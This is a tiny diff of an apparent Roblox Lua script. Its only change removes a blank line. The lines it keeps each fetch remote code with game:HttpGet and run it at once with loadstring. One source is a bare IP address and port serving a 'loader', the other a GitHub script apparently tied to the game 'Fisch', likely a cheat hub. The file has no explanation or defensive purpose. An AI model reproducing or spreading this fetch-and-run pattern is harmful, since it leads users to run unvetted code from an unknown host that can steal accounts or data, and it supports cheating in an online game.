@@ -1,5 +1,4 @@
 ID="adfae535-c3e8-415f-93cd-78086157e2bb";
 loadstring(game:HttpGet("http://5.129.235.74:3910/cdn/loader.luau"))()
 
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Skibidiking123/Fisch1/refs/heads/main/FischMain"))() 
